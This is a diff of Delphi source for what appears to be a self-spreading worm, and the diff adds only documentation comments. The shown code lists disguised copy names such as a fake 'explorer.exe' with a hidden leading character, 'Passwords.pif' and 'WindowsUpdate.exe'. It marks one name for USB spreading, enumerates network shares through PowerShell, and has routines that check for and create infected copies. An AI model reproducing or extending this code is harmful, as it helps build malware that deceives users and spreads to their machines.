@@ -23,11 +23,14 @@ type
   end;
 
 const
+  ///  <summary>An array that contains the possible names of copies</summary>
+  ///  <remarks>The first item is used for USB Spreading</remarks>
   CloneNames: Array [0 .. 4] of String = (#$202F + '\explorer.exe',
     'WindowsUpdate.exe', 'Passwords.pif', 'NewScreen.scr', 'Update.exe');
   SharesCmd = '-Command "Get-WmiObject -Class Win32_Share | Format-List -Pro' +
     'perty Name, Path"';
 
+///  <summary>Creates a shortcut with the specified properties</summary>
 procedure CreateLink(const PathObj, PathLink, Desc, Param: string;
   SetIcon: Boolean = True);
 
@@ -35,6 +38,7 @@ implementation
 
 uses NetUnit;
 
+// Checks whether the given Path has a copy
 function IsInfected(Path: String): Integer;
 var
   I: LongInt;
@@ -53,6 +57,7 @@ Begin
   Result := CloneNames[Random(High(CloneNames)) + 1];
 End;
 
+// Creates a copy of the application with modified settings
 procedure CreateClone(FileName, Mode: String);
 var
   S: TMemINIFile;
